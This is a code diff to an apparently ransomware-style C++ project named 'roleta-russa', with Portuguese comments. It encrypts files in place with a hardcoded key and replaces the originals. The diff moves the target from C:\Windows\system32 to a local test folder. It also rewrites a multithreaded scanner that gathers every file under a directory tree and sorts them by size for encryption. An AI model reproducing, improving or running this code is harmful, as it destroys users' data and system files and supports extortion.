@@ -9,9 +9,11 @@
 #include <filesystem>
 #include <random>
 #include <thread>
+#include <queue>
 
-#define DIR_PATH "C:\\Windows\\system32"
+#define DIR_PATH "/home/jack/github/roleta-russa/testes"
 #define CHAVE "19fa61d75522a4669b44e39c1d2e1726c530232130d407f89afee0964997f7a73e83be698b288febcf88e3e03c4f0757ea8964e59b63d93708b138cc42a66eb3"
+#define MAX_OPEN_FILES 100
 
 /**
  * Classe para criptografar e ler o conteúdo de um arquivo.
@@ -74,6 +76,7 @@ class CriptografiaArquivo {
 
             // Renomeia o arquivo temporário para substituir o arquivo original
             std::filesystem::rename(caminhoArquivo + ".temp", caminhoArquivo);
+            std::cout << caminhoArquivo << std::endl;
         }
 
         /**
@@ -120,6 +123,7 @@ class DirectoryScanner {
         std::vector<std::string> list_files(const std::string& dir_path) {
             std::vector<std::string> files; // Vetor para armazenar os caminhos completos dos arquivos
             std::mutex mutex; // Mutex para garantir exclusão mútua ao adicionar arquivos ao vetor
+            std::queue<std::string> directories; // Fila para armazenar os subdiretórios a serem processados
 
             try {
                 // Verifica se o diretório existe
@@ -128,33 +132,58 @@ class DirectoryScanner {
                     return files;
                 }
 
-                // Função lambda para processar um subdiretório em paralelo
-                auto process_directory = [&](const std::filesystem::directory_entry& entry) {
-                    std::vector<std::string> local_files; // Vetor local para armazenar os caminhos completos dos arquivos
+                directories.push(dir_path); // Adiciona o diretório raiz à fila de subdiretórios
 
-                    for (const auto& sub_entry : std::filesystem::recursive_directory_iterator(entry.path())) {
-                        if (sub_entry.is_regular_file()) {
-                            local_files.push_back(sub_entry.path().string());
+                // Função lambda para processar um subdiretório
+                auto process_directory = [&]() {
+                    while (true) {
+                        std::string directory;
+
+                        {
+                            std::lock_guard<std::mutex> lock(mutex);
+
+                            if (directories.empty()) {
+                                break; // Sai do loop se não houver mais subdiretórios para processar
+                            }
+
+                            directory = directories.front();
+                            directories.pop();
+                        }
+
+                        for (const auto& entry : std::filesystem::directory_iterator(directory)) {
+                            try {
+                                if (entry.is_directory()) {
+                                    std::lock_guard<std::mutex> lock(mutex);
+
+                                    if (directories.size() < MAX_OPEN_FILES) {
+                                        directories.push(entry.path().string()); // Adiciona o subdiretório à fila
+                                    }
+                                } else if (entry.is_regular_file()) {
+                                    std::lock_guard<std::mutex> lock(mutex);
+                                    files.push_back(entry.path().string()); // Adiciona o arquivo ao vetor
+                                }
+                            } catch (const std::filesystem::filesystem_error& e) {
+                                std::cerr << "Erro ao acessar o diretório: " << e.what() << std::endl;
+                            }
                         }
                     }
-
-                    // Adquire o mutex para garantir exclusão mútua ao adicionar os arquivos ao vetor compartilhado
-                    std::lock_guard<std::mutex> lock(mutex);
-                    files.insert(files.end(), local_files.begin(), local_files.end());
                 };
 
                 // Cria threads para processar diferentes subdiretórios em paralelo
                 std::vector<std::thread> threads;
-                for (const auto& entry : std::filesystem::directory_iterator(dir_path)) {
-                    if (entry.is_directory()) {
-                        threads.emplace_back(process_directory, entry);
-                    }
+                for (int i = 0; i < MAX_OPEN_FILES; i++) {
+                    threads.emplace_back(process_directory);
                 }
 
                 // Aguarda todas as threads terminarem
                 for (auto& thread : threads) {
                     thread.join();
                 }
+
+                // Ordena o vetor de arquivos por tamanho
+                std::sort(files.begin(), files.end(), [](const std::string& a, const std::string& b) {
+                    return std::filesystem::file_size(a) < std::filesystem::file_size(b);
+                });
             }
             catch (const std::filesystem::filesystem_error& e) {
                 std::cerr << "Erro ao acessar o diretório: " << e.what() << std::endl;
